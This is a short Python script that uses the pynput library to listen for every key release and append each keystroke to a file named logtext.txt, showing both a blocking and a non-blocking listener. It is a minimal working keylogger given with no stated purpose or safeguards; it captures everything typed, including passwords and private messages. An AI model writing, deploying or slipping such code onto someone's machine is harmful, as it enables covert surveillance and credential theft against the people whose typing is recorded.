from pynput import keyboard

def on_release(key):
    keydata = str(key)
    with open("logtext.txt", "a") as f:
        f.write(keydata)

# Collect events until released
with keyboard.Listener(
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_release=on_release)
listener.start()